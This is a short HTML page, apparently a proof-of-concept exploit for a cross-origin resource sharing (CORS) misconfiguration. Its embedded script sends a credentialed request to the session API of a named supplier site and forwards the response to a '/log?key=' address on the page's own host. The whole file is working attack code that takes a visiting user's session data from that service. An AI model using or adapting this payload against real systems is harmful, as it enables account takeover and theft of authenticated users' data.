<html>
<body>
<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://suppliers.teixeiraduarte.com/api/Session/',true); 
req.withCredentials = true; req.send();  
function reqListener() {    
location='/log?key='+this.responseText; 
};
</script>
</body>
</html>